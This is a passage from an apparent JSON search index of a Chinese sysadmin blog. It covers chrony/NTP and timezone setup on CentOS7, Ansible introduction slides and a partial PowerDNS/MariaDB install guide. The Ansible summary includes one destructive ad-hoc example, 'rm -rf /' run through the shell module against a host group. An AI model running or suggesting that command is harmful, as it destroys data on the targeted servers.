RHEL7/CentOS7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003echrony 包含兩個程序，chronyd 是一個可以在啟動時啟動的守護進程，chronyc 是一個命令行界面程序，可用於監控 chronyd 的性能並在運行時更改各種運行參數。\u003c/p\u003e\n\u003cp\u003e注意 ntpd 和 chronyd 擇一就可，不要同時運作。\u003c/p\u003e\n\u003ch5 id=\"設定時區\"\u003e設定時區\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# timedatectl set-timezone Asia/Taipei\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# timedatectl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      Local time: Tue 2018-03-27 14:13:38 CST\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  Universal time: Tue 2018-03-27 06:13:38 UTC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        RTC time: Tue 2018-03-27 06:13:40\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       Time zone: Asia/Taipei \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCST, +0800\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     NTP enabled: no\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNTP synchronized: no\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e RTC in local TZ: no\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      DST active: n/a\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"設定-chronyd\"\u003e設定 chronyd\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安裝\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# yum install -y chrony\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 配置設定檔\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# cat /etc/chrony.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use public servers from the pool.ntp.org project.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Please consider joining the pool (http://www.pool.ntp.org/join.html).\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eserver 0.tw.pool.ntp.org iburst            ---\u0026gt;改成本地的伺服器\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eserver 1.tw.pool.ntp.org iburst            ---\u0026gt;改成本地的伺服器\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eserver 2.tw.pool.ntp.org iburst            ---\u0026gt;改成本地的伺服器\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eserver 3.tw.pool.ntp.org iburst            ---\u0026gt;改成本地的伺服器\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 啟動服務和設為開機時啟動\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# systemctl enable chronyd\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# systemctl start chronyd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"racking-參數顯示有關系統時間效能\"\u003eracking 參數顯示有關系統時間效能\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# chronyc tracking\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eReference ID    : 3DD8996B \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e61-216-153-107.hinet-ip.hinet.net\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e   ---\u0026gt;表示現在同步的時間伺服器，如果沒有id表示沒有同步\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStratum         : \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e    ---\u0026gt;表示計算機有多少\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;跳hop\u0026#34;\u003c/span\u003e 表示本地的是第四層\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRef time \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eUTC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e  : Tue Mar \u003cspan style=\"color:#ae81ff\"\u003e27\u003c/span\u003e 06:03:38 \u003cspan style=\"color:#ae81ff\"\u003e2018\u003c/span\u003e   ---\u0026gt;最後一次測量的時間\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSystem time     : 0.000040356 seconds fast of NTP time   ---\u0026gt;調整系統時間\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLast offset     : +0.000163738 seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRMS offset      : 0.000163738 seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFrequency       : 21.384 ppm fast\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eResidual freq   : +0.000 ppm\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSkew            : 675.319 ppm\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRoot delay      : 0.008527911 seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRoot dispersion : 0.066466033 seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUpdate interval : 2.0 seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLeap status     : Normal   ---\u0026gt;Normal要顯示此值, Insert second, Delete second or Not synchronised.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# chronyc sources -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e210\u003c/span\u003e Number of sources \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  .-- Source mode  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;^\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e server, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;=\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e peer, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;#\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e local clock.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e / .- Source state \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;*\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e current synced, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;+\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e combined , \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;-\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e not combined,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e| /   \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;?\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e unreachable, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;x\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e time may be in error, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;~\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e time too variable.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e                                                 .- xxxx \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e yyyy \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e +/- zzzz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e      Reachability register \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eoctal\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e -.           |  xxxx \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e adjusted offset,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e      Log2\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ePolling interval\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e --.      |          |  yyyy \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e measured offset,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e                                \u003cspan style=\"color:#ae81ff\"\u003e\\ \u003c/span\u003e    |          |  zzzz \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e estimated error.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e                                 |    |           \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003eMS Name/IP address         Stratum Poll Reach LastRx Last sample\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e===============================================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e^* 59-124-29-241.hinet-ip.h\u0026gt;     \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e37\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e24\u003c/span\u003e  -1462us\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-2363us\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e +/-   49ms\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e^+ 61-216-153-107.hinet-ip.\u0026gt;     \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e37\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e23\u003c/span\u003e   -556us\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -556us\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e +/-   64ms\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e^? 59-125-122-217.hinet-ip.\u0026gt;     \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e     \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e     -     +0ns\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e   +0ns\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e +/-    0ns\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e^- 61-216-153-105.hinet-ip.\u0026gt;     \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e37\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e23\u003c/span\u003e   -280us\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -280us\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e +/-   64ms\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"看同步源頭的資訊\"\u003e看同步源頭的資訊\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# chronyc sourcestats -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e210\u003c/span\u003e Number of sources \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                             .- Number of sample points in measurement set.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            /    .- Number of residual runs with same sign.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                           |    /    .- Length of measurement set \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003etime\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                           |   |    /      .- Est. clock freq error \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eppm\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                           |   |   |      /           .- Est. error in freq.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                           |   |   |     |           /         .- Est. offset.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                           |   |   |     |          |          |   On the -.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                           |   |   |     |          |          |   samples. \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e                           |   |   |     |          |          |             |\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eName/IP Address            NP  NR  Span  Frequency  Freq Skew  Offset  Std Dev\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e==============================================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e59-124-29-241.hinet-ip.h\u0026gt;   \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e135\u003c/span\u003e     -0.454      4.553   -784us    66us\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e61-216-153-107.hinet-ip.\u0026gt;   \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e135\u003c/span\u003e     +4.455     19.761   +622us   247us\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e59-125-122-217.hinet-ip.\u0026gt;   \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e     \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e     +0.000   2000.000     +0ns  4000ms\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e61-216-153-105.hinet-ip.\u0026gt;   \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e136\u003c/span\u003e     +8.965     42.440  +1250us   495us\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"將系統時間寫到硬體主機板上的時間上\"\u003e將系統時間寫到硬體(主機板上的時間)上\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# hwclock --systohc\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e~# date ; hwclock\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eTue Mar \u003cspan style=\"color:#ae81ff\"\u003e27\u003c/span\u003e 14:07:57 CST \u003cspan style=\"color:#ae81ff\"\u003e2018\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eTue \u003cspan style=\"color:#ae81ff\"\u003e27\u003c/span\u003e Mar \u003cspan style=\"color:#ae81ff\"\u003e2018\u003c/span\u003e 02:07:58 PM CST  -0.938012 seconds\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","chrony"],"title":"如何設定時區與NTP服務在RHEL7/CentOS7"},{"categories":["Ansible"],"contents":"認識 Ansible 大綱 簡介 安裝 常用模組 資料夾結構 結語 簡介 安裝部署工具、設定管理工具等\n同類型工具：Chef、Puppet、SaltStack\n不需要 Agent、透過 ssh\nLinux 有 python 即可 ( ssh port )\nWin 啟用 winrm 即可 ( 5986 port )\nhttps://docs.ansible.com/ansible/latest/user_guide/windows_winrm.html#inventory-options 資料夾結構簡單易懂、官方文件豐富易懂、模組多支援設備多、易撰寫\n安裝 pip install ansible\npip3 install ansible yum install ansible\napt-get install ansible\napk add ansible\n常用模組 ping\nshell / command\nfile\nyum\nsystemd / service\ntemplate / copy\ndebug\n常用模組 - ping 常用模組 - shell / command 常用模組 - file 常用模組 - yum 常用模組 - systemd / service 常用模組 - template / copy 常用模組 - debug / register 資料夾結構 結語 選擇適合的 ansible ad-hoc ansible gitlab -m ping ansible gitlab -m shell -a 'rm -rf /' playbook role collection shell script python script others ","date":"September 26, 2020","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200926-ansible/","summary":"\u003ch1 id=\"認識-ansible\"\u003e認識 Ansible\u003c/h1\u003e\n\u003ch2 id=\"大綱\"\u003e大綱\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#%e7%b0%a1%e4%bb%8b\"\u003e簡介\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#%e5%ae%89%e8%a3%9d\"\u003e安裝\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84\"\u003e常用模組\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#%e8%b3%87%e6%96%99%e5%a4%be%e7%b5%90%e6%a7%8b\"\u003e資料夾結構\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#%e7%b5%90%e8%aa%9e\"\u003e結語\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch3 id=\"簡介\"\u003e簡介\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e安裝部署工具、設定管理工具等\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e同類型工具：Chef、Puppet、SaltStack\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e不需要 Agent、透過 ssh\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eLinux 有 python 即可 ( ssh port )\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWin 啟用 winrm 即可 ( 5986 port )\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://docs.ansible.com/ansible/latest/user_guide/windows_winrm.html#inventory-options\" target=\"_blank\" rel=\"noopener\"\u003ehttps://docs.ansible.com/ansible/latest/user_guide/windows_winrm.html#inventory-options\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e資料夾結構簡單易懂、官方文件豐富易懂、模組多支援設備多、易撰寫\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"/posts/2020/20200926-ansible/pics/20200926_ansible.pics/20200926_ansible0.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/posts/2020/20200926-ansible/pics/20200926_ansible.pics/20200926_ansible1.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"安裝\"\u003e安裝\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003epip install ansible\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003epip3 install ansible\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eyum install ansible\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eapt-get install ansible\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eapk add ansible\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"/posts/2020/20200926-ansible/pics/20200926_ansible.pics/20200926_ansible2.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"常用模組\"\u003e常用模組\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-ping\"\u003eping\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-shell-command\"\u003eshell / command\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-file\"\u003efile\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-yum\"\u003eyum\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-systemd-service\"\u003esystemd / service\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-template-copy\"\u003etemplate / copy\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"#%e5%b8%b8%e7%94%a8%e6%a8%a1%e7%b5%84-debug\"\u003edebug\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch4 id=\"常用模組---ping\"\u003e常用模組 - ping\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"/posts/2020/20200926-ansible/pics/20200926_ansible.pics/20200926_ansible3.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch4 id=\"常用模組---shell--command\"\u003e常用模組 - shell / command\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"/posts/2020/20200926-ansible/pics/20200926_ansible.pics/20200926_ansible4.png\" alt=\"\"\u003e\u003c/p\u003e","tags":["Ansible","introduction","slides"],"title":"Ansible 簡介"},{"categories":["URL","DNS","Linux","PowerDNS"],"contents":" Install PowerDNS and PowerDNS-Admin on Ubuntu 22.04|20.04|18.04 Master-Master PowerDNS with Galera Replication https://www.scaleway.com/en/docs/installing-powerdns-server-on-ubuntu-bionic/ Install PowerDNS $ sudo apt update $ sudo apt install mariadb-server -y $ sudo mysql -u root CREATE DATABASE powerdns; GRANT ALL ON powerdns.* TO \u0026#39;powerdns\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;Str0ngPasswOrd\u0026#39;; FLUSH PRIVILEGES; USE powerdns; CREATE TABLE domains ( id INT AUTO_INCREMENT, name VARCHAR(255) NOT NULL, master VARCHAR(128) DEFAULT NULL, last_check INT DEFAULT NULL, type VARCHAR(6) NOT NULL, notified_serial INT UNSIGNED DEFAULT NULL, account VARCHAR(40) CHARACTER SET \u0026#39;utf8\u0026#39; DEFAULT NULL, PRIMARY KEY (id) ) Engine=InnoDB CHARACTER SET \u0026#39;latin1\u0026#39;; CREATE UNIQUE INDEX name_index ON domains(name); CREATE TABLE records ( id BIGINT AUTO_INCREMENT, domain_id INT DEFAULT NULL, name VARCHAR(255) DEFAULT NULL, type VARCHAR(10) DEFAULT NULL, content VARCHAR(64000) DEFAULT NULL, ttl INT DEFAULT NULL, prio INT DEFAULT NULL, change_date INT DEFAULT NULL, disabled TINYINT(1) DEFAULT 0, ordername VARCHAR(255) BINARY DEFAULT NULL, auth TINYINT(1) DEFAULT 1, PRIMARY KEY (id) ) Engine=InnoDB CHARACTER SET \u0026#39;latin1\u0026#39;; CREATE INDEX nametype_index ON records(name,type); CREATE INDEX domain_id ON records(domain_id); CREATE INDEX ordername ON records (ordername); CREATE TABLE supermasters ( ip VARCHAR(64) NOT NULL, nameserver VARCHAR(255) NOT NULL, account VARCHAR(40) CHARACTER SET \u0026#39;utf8\u0026#39; NOT NULL, PRIMARY KEY (ip, nameserver) ) Engine=InnoDB CHARACTER SET \u0026#39;latin1\u0026#39;; CREATE TABLE comments ( id INT AUTO_INCREMENT, domain_id 